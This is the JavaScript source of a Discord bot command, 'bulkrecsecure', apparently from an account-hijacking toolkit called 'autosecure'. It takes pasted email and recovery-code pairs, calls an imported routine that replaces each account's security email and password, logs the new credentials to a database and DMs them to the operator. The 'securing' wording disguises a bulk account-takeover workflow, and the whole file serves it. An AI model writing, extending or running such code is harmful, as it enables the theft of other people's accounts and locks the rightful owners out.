const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const recoverycodesecure = require('../../../autosecure/utils/secure/recoveryCodeSecure');
const generate = require('../../../autosecure/utils/generate');
const { queryParams } = require('../../../db/database');
const { domains } = require('../../../config.json');

module.exports = {
    name: "bulkrecsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            if (interaction.isModalSubmit()) {
                await interaction.deferReply({ ephemeral: true });

                let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id])
                //    console.log(settings)
        
                    if (settings.length === 0) {
                        console.log(`Settings not found for user: ${interaction.user.id}`);
                        return interaction.reply({
                            content: `Couldn't get your settings!`,
                            ephemeral: true,
                        });
                    }

                settings = settings[0];

                const accounts = interaction.fields.getTextInputValue('accounts');
                const targetEmails = interaction.fields.getTextInputValue('target_emails') || "";

                const accountLines = accounts.trim().split('\n');
                const targetEmailLines = targetEmails.trim() ? targetEmails.trim().split('\n') : [];

                const maxAccounts = Math.min(accountLines.length, 10);
                if (maxAccounts > 10) {
                    return interaction.editReply('Please only secure 10 accounts at the same time!');
                }

                if (maxAccounts === 0) {
                    return interaction.editReply('Please provide at least one account to secure.');
                }

                await interaction.editReply(`Securing ${maxAccounts} accounts at the same time, please wait...`);

                for (let i = 0; i < maxAccounts; i++) {
                    const accountInfo = accountLines[i].trim().split(':');

                    if (accountInfo.length < 2) {
                        const invalidMsg = `## Recovery Failed\n\nEmail: \`${accountInfo[0] || 'Unknown'}\`\nReason: Invalid format. Expected email:recoverycode`;
                        interaction.user.send(invalidMsg).catch(err => console.error('Failed to send DM for invalid format:', err));
                        continue;
                    }

                    const [email, recoveryCode] = accountInfo;

                    let secEmail = `${generate(16)}@${settings.domain || domains[0]}`;
                    let password = generate(16);

                    if (i < targetEmailLines.length && targetEmailLines[i].trim()) {
                        const targetLine = targetEmailLines[i].trim();

                        if (targetLine.includes(':')) {
                            const [targetEmail, targetPass] = targetLine.split(':');
                            secEmail = targetEmail.trim();
                            password = targetPass.trim();
                        } else {
                            secEmail = targetLine;
                        }
                    }

                    try {
                        const result = await recoverycodesecure(email, recoveryCode, secEmail, password);
                     //   console.log(result);

                        let dmContent = "";

                        switch (result) {
                            case "invalid":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Invalid recovery code`;
                                break;
                            case "tfa":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Two-factor authentication required`;
                                break;
                            case "same":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Same details provided`;
                                break;
                            case "unknown":
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Unknown error occurred`;
                                break;
                            case null:
                                dmContent = `## Recovery Failed\n\nEmail: \`${email}\`\nReason: Account not found`;
                                break;
                            default:
                                let recsecId = generate(32);
                                await queryParams(
                                    `INSERT INTO actions(id, action) VALUES(?, ?)`,
                                    [`${recsecId}`, `copyrec|${result.email2}|${result.secEmail}|${result.password}|${result.recoveryCode}`]
                                );

                                dmContent = {
                                    embeds: [
                                        {
                                            title: `Secured your account succesfully!`,
                                            fields: [
                                                { name: "Email", value: "```\n" + result.email2 + "\n```", inline: true },
                                                { name: "Security Email", value: "```\n" + result.secEmail + "\n```", inline: true },
                                                { name: "Password", value: "```\n" + result.password + "\n```", inline: false },
                                                { name: "Recovery Code", value: "```\n" + result.recoveryCode + "\n```", inline: false }
                                            ],
                                            color: 0xb2c7e0
                                        }
                                    ],
                                    components: [
                                        new ActionRowBuilder().addComponents(
                                            new ButtonBuilder()
                                                .setCustomId(`copyrec|${recsecId}`)
                                                .setLabel('Copy Text')
                                                .setStyle(ButtonStyle.Secondary)
                                        )
                                    ],
                                    ephemeral: true
                                };
                        }

                        await interaction.user.send(dmContent);
                    } catch (error) {
                        console.error(`Error processing ${email}:`, error);
                        const errorMsg = `## Recovery Error\n\nEmail: \`${email}\`\nReason: An error occurred`;
                        await interaction.user.send(errorMsg).catch(err => console.error('Failed to send error DM:', err));
                    }
                }

                await interaction.editReply(`Started securing, you will receive these accounts individually!`);
            }
        } catch (error) {
            console.error('Error in bulkrecsecure command:', error);

            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: 'An error occurred while processing the command.',
                    ephemeral: true
                });
            } else {
                await interaction.editReply('An error occurred while processing the command.');
            }
        }
    }
};
